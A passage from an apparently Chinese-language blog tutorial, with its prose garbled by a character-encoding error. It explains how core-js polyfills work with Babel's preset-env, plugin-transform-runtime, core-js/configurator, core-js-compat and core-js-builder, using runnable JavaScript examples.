<p>å¯ä»¥çœ‹åˆ°ï¼Œæºä»£ç ä¸­å¢åŠ äº†Promise.tryï¼Œå¼•å…¥çš„ç‰¹æ€§ä¹Ÿéšä¹‹å¢åŠ äº†å¯¹åº”çš„core-jsç‰¹æ€§å¼•å…¥ã€‚å› æ­¤ï¼Œä½¿ç”¨@babel/preset-envçš„usageé…ç½®ï¼Œå¯ä»¥ä¿è¯å…¼å®¹æ€§çš„åŒæ—¶ï¼Œæœ€å°åŒ–å¼•å…¥core-jsç‰¹æ€§ã€‚å¦å¤–è¿™ä¸ªé…ç½®å¹¶ä¸ä¼šè‡ªåŠ¨å¼•å…¥æè®®ç‰¹æ€§ï¼Œå¦‚æœéœ€è¦åˆ™é¢å¤–é…ç½®proposalsä¸ºtrueã€‚</p>
<h3 data-id="heading-17">@babel/polyfill</h3>
<p>@babel/polyfillæ˜¯ä¸€ä¸ªå·²ç»è¢«å¼ƒç”¨çš„åŒ…ï¼Œæ¨èç›´æ¥ä½¿ç”¨core-js/stableã€‚æŸ¥çœ‹@babel/polyfillæºç ï¼Œå‘ç°ä»–å°±æ˜¯å¼•å…¥äº†core-jsç‰¹æ€§ä¸regenerator-runtimeè¿™ä¸ªåŒ…ã€‚regenerator-runtimeä¹Ÿæ˜¯ä¸€ä¸ªå…¼å®¹æ€§ç›¸å…³çš„åŒ…ï¼Œå¯ä»¥å¸®åŠ©æ·»åŠ generatoreå’Œasync/awaitç›¸å…³è¯­æ³•ã€‚ä½œä¸ºæ›¿ä»£å¯ä»¥è¿™æ ·å¼•å…¥ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-string">'core-js/stable'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'regenerator-runtime/runtime'</span>;
</code></pre>
<h3 data-id="heading-18">@babel/runtime</h3>
<p>@babel/runtimeå°±åƒè‡ªåŠ¨å¼•å…¥ç‰ˆçš„core-js-pureã€‚å®ƒè¿˜æ˜¯æ ¹æ®ä»£ç å®é™…ä½¿ç”¨çš„ç‰¹æ€§æ¥æ³¨å…¥core-jsç‰¹æ€§ï¼Œä½†å®ƒä¸æ³¨å…¥åˆ°å…¨å±€ï¼Œè€Œæ˜¯å¼•å…¥è¿™äº›APIå†è°ƒç”¨ã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨@babel/plugin-transform-runtimeæ’ä»¶ï¼Œé‡Œé¢åŒ…å«äº†@babel/runtimeç›¸å…³é€»è¾‘ã€‚é¦–å…ˆçœ‹ä¸‹Babelé…ç½®ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"plugins"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-string">"@babel/plugin-transform-runtime"</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"corejs"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>å†è½¬ä¹‰ä¸Šä¸€èŠ‚ä¸­çš„ä»£ç ï¼Œç»“æœå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æºä»£ç </span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span>{});

<span class="hljs-comment">// ç”Ÿæˆä»£ç </span>
<span class="hljs-keyword">import</span> _Promise <span class="hljs-keyword">from</span> <span class="hljs-string">"@babel/runtime-corejs3/core-js-stable/promise"</span>;
<span class="hljs-keyword">import</span> _Map <span class="hljs-keyword">from</span> <span class="hljs-string">"@babel/runtime-corejs3/core-js-stable/map"</span>;
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title function_">_Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title function_">_Map</span>();
_Promise.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {});
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶æ²¡æœ‰ç›´æ¥å¼•å…¥core-js-pureï¼Œä½†æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚æ‰“å¼€@babel/runtime-corejs3è¿™ä¸ªåŒ…æŸ¥çœ‹ï¼Œé‡Œé¢å®é™…ä¸Šå°±æ˜¯å¯¼å‡ºäº†core-js-pureä¸­çš„ç‰¹æ€§ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// @babel/runtime-corejs3/core-js-stable/map.js æ–‡ä»¶å†…å®¹</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-pure/stable/map"</span>);
</code></pre>
<h2 data-id="heading-19">core-js/configuratorå¼ºåˆ¶æ§åˆ¶</h2>
<p>å¦‚æœå¸Œæœ›åœ¨æ­£å¸¸å¼•å…¥core-jsæ—¶ï¼Œå¯¹äºéƒ¨åˆ†ç‰¹æ®Šå±æ€§è¿›è¡Œå¼•å…¥æˆ–è€…ä¸å¼•å…¥çš„æ§åˆ¶ï¼Œå°±éœ€è¦ç”¨åˆ°core-js/configuratorã€‚è¿™ä¸ªå·¥å…·å¯ä»¥é…ç½®ä¸‰ç§é€‰é¡¹ï¼š</p>
<ul>
<li>useNative: å½“ç¯å¢ƒä¸­æœ‰è¿™ä¸ªç‰¹æ€§æ—¶ä¸å¼•å…¥ï¼Œå½“ç¡®å®šæ²¡æœ‰æ—¶æ‰å¼•å…¥</li>
<li>usePolyfill: æ˜ç¡®å¼•å…¥è¿™ä¸ªç‰¹æ€§</li>
<li>useFeatureDetection: é»˜è®¤è¡Œä¸ºï¼Œå’Œä¸ä½¿ç”¨core-js/configuratorä¸€è‡´</li>
</ul>
<h3 data-id="heading-20">useNativeä¸å¼•å…¥</h3>
<p>é¦–å…ˆè¯•è¯•ä¸å¼•å…¥ç‰¹æ€§ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨Promiseè¿™ä¸ªç‰¹æ€§ä¸ºä¾‹ã€‚é¦–å…ˆæ˜¯ä¸å¼•å…¥core-jsçš„æ•ˆæœï¼Œå¯ä»¥çœ‹åˆ°å…¨å±€Promiseå¯¹è±¡è¢«æˆ‘ä»¬æ”¹æ‰äº†ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> jzplp = {};
<span class="hljs-title class_">Promise</span> = jzplp;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>, <span class="hljs-title class_">Promise</span> === jzplp);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
{} true
*/</span>
</code></pre>
<p>ç„¶ååœ¨ä¸­é—´å¼•å…¥core-jsè¯•è¯•ã€‚å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ”¹æ‰çš„Promiseï¼Œè¢«core-jsç»™æ”¹å›å»äº†ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> jzplp = {};
<span class="hljs-title class_">Promise</span> = jzplp;
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/actual"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>, <span class="hljs-title class_">Promise</span> === jzplp);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
[Function: Promise] false
*/</span>
</code></pre>
<p>è¿™æ—¶å€™ï¼Œå¦‚æœä¸å¸Œæœ›core-jsæ”¹æ‰æˆ‘ä»¬è‡ªå®šä¹‰çš„Promiseï¼Œå¯ä»¥åˆ©ç”¨useNativeé…ç½®ï¼Œå¼ºåˆ¶core-jsä¸å¼•å…¥è¿™ä¸ªç‰¹æ€§ã€‚çœ‹ç»“æœcore-jså¼•å…¥ä¹‹åï¼Œæˆ‘ä»¬è‡ªå®šä¹‰çš„Promiseä¾ç„¶å­˜åœ¨ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> configurator = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/configurator"</span>);
<span class="hljs-title function_">configurator</span>({
  <span class="hljs-attr">useNative</span>: [<span class="hljs-string">"Promise"</span>],
});
<span class="hljs-keyword">const</span> jzplp = {};
<span class="hljs-title class_">Promise</span> = jzplp;
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/actual"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>, <span class="hljs-title class_">Promise</span> === jzplp);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
{} true
*/</span>
</code></pre>
<h3 data-id="heading-21">usePolyfillå¼ºåˆ¶å¼•å…¥</h3>
<p>æƒ³è¦éªŒè¯usePolyfillçš„æ•ˆæœï¼Œéœ€è¦æ‰¾ä¸€ä¸ªç¯å¢ƒä¸­æœ¬æ¥å­˜åœ¨çš„ç‰¹æ€§ï¼Œcore-jså³ä½¿å¼•å…¥ä¹Ÿä¸ä¼šä¿®æ”¹çš„ç‰¹æ€§ã€‚Promiseä¸è¡Œï¼Œå› ä¸ºcore-jså¼•å…¥æ—¶ä¼šå¯¹è¿™ä¸ªPromiseå¢åŠ å­ç‰¹æ€§ã€‚Promise.tryä¹Ÿä¸è¡Œï¼Œå› ä¸ºåŸæ¥ç¯å¢ƒä¸­ä¸å­˜åœ¨ã€‚è¿™é‡Œè¯•ä¸€ä¸‹Promise.anyï¼Œè¿™æ˜¯ç¯å¢ƒä¸­æœ¬æ¥å°±å­˜åœ¨çš„ç‰¹æ€§ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title function_">jzplp</span> = (<span class="hljs-params"/>) =&gt; {};
<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> = jzplp;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>, <span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> === jzplp);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
[Function: any]
[Function: jzplp] true
*/</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼ŒPromise.anyåŸæ¥å°±å­˜åœ¨ï¼Œä½†æ˜¯è¢«æˆ‘ä»¬ä¿®æ”¹æˆäº†æ–°å‡½æ•°ã€‚å†å¼•å…¥core-jsè¯•è¯•ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title function_">jzplp</span> = (<span class="hljs-params"/>) =&gt; {};
<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> = jzplp;
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>, <span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> === jzplp);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
[Function: any]
[Function: jzplp] true
*/</span>
</code></pre>
<p>å¼•å…¥äº†core-jsä¹‹åï¼Œç»“æœæ²¡æœ‰å˜åŒ–ã€‚è¿™è¯´æ˜core-jså¹¶ä¸ä¼šä¿®æ”¹æˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°ã€‚è¿™æ—¶å€™å°±å¯ä»¥è¯•ä¸€ä¸‹usePolyfillçš„æ•ˆæœäº†ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> configurator = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/configurator"</span>);
<span class="hljs-title function_">configurator</span>({
  <span class="hljs-attr">usePolyfill</span>: [<span class="hljs-string">"Promise.any"</span>],
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title function_">jzplp</span> = (<span class="hljs-params"/>) =&gt; {};
<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> = jzplp;
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>, <span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> === jzplp);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
[Function: any]
[Function: any] false
*/</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼ŒPromise.anyåˆè¢«æ”¹ä¸ºäº†çœŸæ­£èµ·æ•ˆæœçš„å‡½æ•°ï¼Œè¿™è¯´æ˜usePolyfillçš„å¼ºåˆ¶å¼•å…¥ç‰¹æ€§æ˜¯æœ‰æ•ˆçš„ã€‚</p>
<h2 data-id="heading-22">core-jsä¸­çš„ç‰¹æ€§é€‰æ‹©</h2>
<p>å‰é¢æˆ‘ä»¬ä½“éªŒäº†Babelæ ¹æ®æµè§ˆå™¨å…¼å®¹æ€§ï¼Œé€‰æ‹©ä¸åŒçš„core-jsç‰¹æ€§å¼•å…¥ï¼Œé‚£ä¹ˆä¸åŒæµè§ˆå™¨å…¼å®¹å“ªäº›ç‰¹æ€§çš„æ•°æ®æ˜¯ä»å“ªé‡Œè·å–å‘¢ï¼Ÿcore-jsæœ¬èº«å°±æä¾›äº†è¿™ä¸ªåŠŸèƒ½ã€‚</p>
<h3 data-id="heading-23">core-js-compat</h3>
<p>core-js-compatæä¾›äº†ä¸åŒæµè§ˆå™¨å¯¹åº”ç‰¹æ€§çš„å…¼å®¹æ€§æ•°æ®ã€‚å®ƒæœ‰å¥½å‡ ä¸ªå‚æ•°ï¼Œè¿™é‡Œå…ˆåˆ—ä¸¾ä¸€ä¸‹å«ä¹‰ï¼š</p>
<ul>
<li>targets: Browserslistæ ¼å¼çš„æµè§ˆå™¨å…¼å®¹é…ç½®</li>
<li>modules: éœ€è¦è®¾ç½®å…¼å®¹æ€§é…ç½®çš„æ¨¡å—ï¼Œå¯ä»¥æ˜¯core-js/fullï¼Œä¹Ÿå¯ä»¥æ˜¯æŸä¸ªç‰¹æ€§ï¼Œç”šè‡³æ˜¯æ­£åˆ™</li>
<li>exclude: éœ€è¦æ’é™¤çš„æ¨¡å—</li>
<li>version: ä½¿ç”¨çš„core-jsç‰ˆæœ¬</li>
<li>inverse: åå‘è¾“å‡ºï¼Œå³è¾“å‡ºä¸éœ€è¦å…¼å®¹çš„ç‰¹æ€§åˆ—è¡¨</li>
</ul>
<p>è¿™é‡Œä¸¾å‡ ä¸ªä¾‹å­è¯•ä¸€ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> compat = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-compat"</span>);
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">compat</span>({
  <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 10%"</span>,
  <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
  <span class="hljs-attr">version</span>: <span class="hljs-string">"3.47"</span>,
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
{
  list: [
    'es.iterator.concat',
    'es.math.sum-precise',
    'es.async-iterator.async-dispose',
    'esnext.array.group',
    'esnext.array.group-by',
    ...å…¶å®ƒç‰¹æ€§
  ],
  targets: {
    'es.iterator.concat': { 'chrome-android': '143' },
    'es.math.sum-precise': { 'chrome-android': '143' },
    'es.async-iterator.async-dispose': { 'chrome-android': '143' },
    'esnext.array.group': { 'chrome-android': '143' },
    'esnext.array.group-by': { 'chrome-android': '143' },
    ...å…¶å®ƒç‰¹æ€§
  }
}
*/</span>
</code></pre>
<p>compatä¼šæ ¹æ®æˆ‘ä»¬è®¾ç½®çš„æµè§ˆå™¨å…¼å®¹æ€§é…ç½®ï¼Œè¾“å‡ºç‰¹æ€§åˆ—è¡¨ï¼ŒåŒ…å«ä¸¤ä¸ªå­—æ®µï¼šlistæ˜¯ä¸€ä¸ªç‰¹æ€§åç§°åˆ—è¡¨ï¼›targetsæ˜¯ä¸€ä¸ªMapç»“æ„ï¼Œkeyä¸ºç‰¹æ€§åï¼Œå€¼ä¸ºå¯ä»¥å…¼å®¹çš„æµè§ˆå™¨ã€‚å‡è®¾æˆ‘ä»¬æŠŠä¸Šé¢çš„ targetsæ”¹æˆ &gt; 50%ï¼Œæ­¤æ—¶ä¼šè¾“å‡ºç©ºå€¼ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> compat = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-compat"</span>);
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">compat</span>({
  <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 50%"</span>,
  <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
  <span class="hljs-attr">version</span>: <span class="hljs-string">"3.47"</span>,
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
{ list: [], targets: {} }
*/</span>
</code></pre>
<p>æˆ‘ä»¬å¢åŠ excludeï¼Œæ’é™¤éƒ¨åˆ†å±æ€§ï¼Œå¯ä»¥çœ‹åˆ°ç‰¹æ€§æ•°é‡å¤§å¤§å‡å°‘ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> compat = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-compat"</span>);
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">compat</span>({
  <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 10%"</span>,
  <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
  <span class="hljs-attr">exclude</span>: [<span class="hljs-string">"esnext"</span>],
  <span class="hljs-attr">version</span>: <span class="hljs-string">"3.47"</span>,
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
{
  list: [
    'es.iterator.concat',
    'es.math.sum-precise',
    'es.async-iterator.async-dispose',
    'web.dom-exception.stack',
    'web.immediate',
    'web.structured-clone'
  ],
  targets: {
    'es.iterator.concat': { 'chrome-android': '143' },
    'es.math.sum-precise': { 'chrome-android': '143' },
    'es.async-iterator.async-dispose': { 'chrome-android': '143' },
    'web.dom-exception.stack': { 'chrome-android': '143' },
    'web.immediate': { 'chrome-android': '143' },
    'web.structured-clone': { 'chrome-android': '143' }
  }
}
*/</span>
</code></pre>
<p>å†è¯•ä¸€ä¸‹inverseçš„æ•ˆæœï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> compat = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-compat"</span>);
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">compat</span>({
  <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 10%"</span>,
  <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
  <span class="hljs-attr">version</span>: <span class="hljs-string">"3.47"</span>,
  <span class="hljs-attr">inverse</span>: <span class="hljs-literal">true</span>
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
{
  list: [
    'es.symbol',
    'es.symbol.description',
    ...å…¶å®ƒç‰¹æ€§
  ],
  targets: {
    'es.symbol': {},
    'es.symbol.description': {},
    ...å…¶å®ƒç‰¹æ€§
  }
}
*/</span>
</code></pre>
<p>å› ä¸ºè¾“å‡ºçš„æ˜¯ä¸éœ€è¦å¼•å…¥core-jså…¼å®¹çš„ç‰¹æ€§ï¼Œæ‰€ä»¥ç‰¹æ€§æ•°é‡éå¸¸å¤šï¼Œè€Œä¸”targetsä¸­æ²¡æœ‰åˆ—å‡ºæ”¯æŒçš„æµè§ˆå™¨ç‰ˆæœ¬ã€‚</p>
<h3 data-id="heading-24">core-js-builder</h3>
<p>å‰é¢ä»‹ç»çš„core-js-compatæ˜¯æ¥æ”¶å‚æ•°ä¹‹åï¼Œè¾“å‡ºcore-jsçš„ç‰¹æ€§åˆ—è¡¨æ•°ç»„ã€‚è€Œcore-js-builderæ¥æ”¶ç±»ä¼¼çš„å‚æ•°ï¼Œç›´æ¥è¾“å‡ºå¼•ç”¨core-jsçš„ä»£ç ã€‚æˆ‘ä»¬é¦–å…ˆåˆ—ä¸¾ä¸€ä¸‹å‚æ•°ï¼š</p>
<ul>
<li>targets: Browserslistæ ¼å¼çš„æµè§ˆå™¨å…¼å®¹é…ç½®</li>
<li>modules: éœ€è¦è®¾ç½®å…¼å®¹æ€§é…ç½®çš„æ¨¡å—ï¼Œå¯ä»¥æ˜¯core-js/fullï¼Œä¹Ÿå¯ä»¥æ˜¯æŸä¸ªç‰¹æ€§ï¼Œç”šè‡³æ˜¯æ­£åˆ™</li>
<li>exclude: éœ€è¦æ’é™¤çš„æ¨¡å—</li>
<li>format: 'bundle'è¾“å‡ºæ‰“åŒ…åçš„æºç ï¼›'cjs'å’Œ'esm'è¾“å‡ºå¯¹åº”æ ¼å¼çš„å¼•ç”¨ä»£ç </li>
<li>filename: è¾“å‡ºçš„æ–‡ä»¶å</li>
</ul>
<p>æˆ‘ä»¬å…ˆè¯•ä¸€ä¸‹ä¾‹å­ã€‚é¦–å…ˆæ˜¯formatæ ¼å¼çš„ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> builder = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-builder"</span>);
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">funJzplp</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">builder</span>({
    <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 30%"</span>,
    <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
    <span class="hljs-attr">format</span>: <span class="hljs-string">'bundle'</span>,
  });
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
}
<span class="hljs-title function_">funJzplp</span>();

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
...ä»£ç å¾ˆé•¿ï¼Œè¿™é‡ŒèŠ‚é€‰éƒ¨åˆ†
 (function(module, exports, __webpack_require__) {
"use strict";
var NATIVE_BIND = __webpack_require__(8);
var FunctionPrototype = Function.prototype;
*/</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œbuilderå‡½æ•°è¾“å‡ºäº†éå¸¸é•¿çš„ä»£ç ï¼Œå†…å®¹å®é™…ä¸ºè¾“å‡ºçš„ç‰¹æ€§ç»è¿‡æ‰“åŒ…ä¹‹åçš„ç»“æœä»£ç ã€‚å†è¯•ä¸€ä¸‹'cjs'å’Œ'esm'ï¼Œè¾“å‡ºçš„æ˜¯å¯¹åº”æœ¨å—çš„å¼•ç”¨ä»£ç ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// format: 'cjs' è¾“å‡ºç»“æœ</span>
...ä»£ç å¾ˆé•¿ï¼Œè¿™é‡ŒèŠ‚é€‰éƒ¨åˆ†
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/modules/es.iterator.concat'</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/modules/es.math.sum-precise'</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/modules/es.async-iterator.async-dispose'</span>);
*/

<span class="hljs-comment">// format: 'esm' è¾“å‡ºç»“æœ</span>
...ä»£ç å¾ˆé•¿ï¼Œè¿™é‡ŒèŠ‚é€‰éƒ¨åˆ†
<span class="hljs-keyword">import</span> <span class="hljs-string">'core-js/modules/es.iterator.concat.js'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'core-js/modules/es.math.sum-precise.js'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'core-js/modules/es.async-iterator.async-dispose.js'</span>;
*/
</code></pre>
<p>å¦‚æœè®¾ç½®äº†filenameï¼Œcore-js-builderä¼šåˆ›å»ºè¯¥åç§°çš„æ–‡ä»¶ï¼Œå¹¶å°†ä»£ç å†™å…¥åˆ°æ–‡ä»¶ä¸­ã€‚</p>
<h2 data-id="heading-25">æ€»ç»“</h2>
<p>è¿™ç¯‡æ–‡ç« æè¿°äº†core-jsç›¸å…³åŒ…çš„ä»£ç å†…å®¹å’Œä½¿ç”¨æ–¹å¼ã€‚core-jså®é™…ä¸Šå°±æ˜¯æä¾›äº†JavaScriptä¸­ä¸€äº›APIç‰¹æ€§çš„å…¼å®¹å®ç°æ–¹å¼ã€‚å®ƒä¸å®ç°è¯­æ³•å…¼å®¹çš„Babelä¸€èµ·ï¼Œå¯ä»¥åšåˆ°å¤§éƒ¨åˆ†JavaScriptçš„å…¼å®¹æ€§ã€‚å½“ç„¶core-jså’ŒBabelä¹Ÿä¸æ˜¯ä¸‡èƒ½çš„ï¼Œå®ƒä»¬éƒ½æœ‰å„è‡ªæ— æ³•è½¬ä¹‰å’Œå…¼å®¹çš„è¯­æ³•å’Œç‰¹æ€§ã€‚</p>
<p>core-jsè¿™ä¸ªåŒ…åå­—èµ·çš„éå¸¸å¥½ï¼Œä¸€å¬å°±æ˜¯JavaScriptçš„â€œæ ¸å¿ƒâ€åŒ…ã€‚ç”±äºå®ƒå®ç°äº†å¾ˆå¤šAPIç‰¹æ€§ï¼Œè€Œä¸”å¼•ç”¨æ•°é‡éå¸¸éå¸¸å¤§ï¼Œå› æ­¤å«â€œæ ¸å¿ƒâ€ä¹Ÿä¸ä¸ºè¿‡ã€‚è™½ç„¶è¿™ä¸ªåŒ…å¼•ç”¨é‡å¾ˆå¤§ï¼Œä½†ä¸å¦‚React/Vueæˆ–è€…ä¸€äº›å…¶å®ƒåŒ…å‡ºåã€‚å› ä¸ºè¿™ä¸ªåŒ…æ˜¯å¤„ç†çš„æ›´åº•å±‚çš„å…¼å®¹æ€§æœ‰é—®é¢˜ï¼Œå› æ­¤ç”¨æˆ·æ„ŸçŸ¥ä¸å¼ºã€‚core-jsåŒ…çš„ä½œè€…è¿˜å› ä¸ºæ²¡æœ‰é’±è€Œé‡åˆ°å¾ˆå¤šé—®é¢˜ï¼Œè¿™ä¸ªåŒ…å¹¶æ²¡æœ‰è®©ä»–å˜çš„å¯Œæœ‰ã€‚</p>
<h2 data-id="heading-26">å‚è€ƒ</h2>
<ul>
<li>core-js æ–‡æ¡£<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fcore-js.io%2F" target="_blank" title="https://core-js.io/" ref="nofollow noopener noreferrer">core-js.io/</a></li>
<li>Github core-js<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzloirock%2Fcore-js" target="_blank" title="https://github.com/zloirock/core-js" ref="nofollow noopener noreferrer">github.com/zloirock/coâ€¦</a></li>
<li>è§£é”Babelæ ¸å¿ƒåŠŸèƒ½ï¼šä»è½¬ä¹‰è¯­æ³•åˆ°æ’ä»¶å¼€å‘<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fjzplp.github.io%2F2025%2Fbabel-intro.html" target="_blank" title="https://jzplp.github.io/2025/babel-intro.html" ref="nofollow noopener noreferrer">jzplp.github.io/2025/babel-â€¦</a></li>
<li>@babel/preset-env æ–‡æ¡£<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fbabeljs.io%2Fdocs%2Fbabel-preset-env" target="_blank" title="https://babeljs.io/docs/babel-preset-env" ref="nofollow noopener noreferrer">babeljs.io/docs/babel-â€¦</a></li>
<li>@babel/polyfill æ–‡æ¡£<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fbabeljs.io%2Fdocs%2Fbabel-polyfill" target="_blank" title="https://babeljs.io/docs/babel-polyfill" ref="nofollow noopener noreferrer">babeljs.io/docs/babel-â€¦</a></li>
<li>@babel/runtime æ–‡æ¡£<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fbabeljs.io%2Fdocs%2Fbabel-runtime" target="_blank" title="https://babeljs.io/docs/babel-runtime" ref="nofollow noopener noreferrer">babeljs.io/docs/babel-â€¦</a></li>
<li>Github regenerator-runtime<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffacebook%2Fregenerator%2Ftree%2Fmain%2Fpackages%2Fruntime" target="_blank" title="https://github.com/facebook/regenerator/tree/main/packages/runtime" ref="nofollow noopener noreferrer">github.com/facebook/reâ€¦</a></li>
<li>Github core-js-compat<br/>
